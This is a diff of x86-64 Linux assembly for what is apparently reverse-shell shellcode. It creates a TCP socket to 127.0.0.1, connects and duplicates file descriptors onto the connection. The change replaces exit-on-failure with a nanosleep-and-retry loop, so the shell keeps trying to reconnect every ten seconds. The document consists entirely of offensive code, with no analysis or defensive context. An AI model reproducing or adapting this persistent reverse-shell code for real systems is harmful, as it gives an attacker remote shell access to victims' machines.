@@ -10,7 +10,12 @@ sockaddr:
         dd 0x0100007F
         dq 0
 
+timespec:
+        dq 10
+        dq 0
+
 _start:
+connect:
         ;socket(AF_INET, SOCK_STREAM, 0)
         mov rax, 41
         mov rdi, 2
@@ -28,9 +33,19 @@ _start:
         mov rax, 42
         syscall
         test rax, rax
-        js exit_with_error
+        js wait_and_retry
 
         xor rsi, rsi
+        jmp dup2_loop
+
+wait_and_retry:
+        ;nanosleep(10, 0)
+        mov rax, 35
+        lea rdi, [rel timespec]
+        xor rsi, rsi
+        syscall
+        jmp connect
+
 dup2_loop:
         ;dup2(client_fd, new_fd)
         mov rax, 33
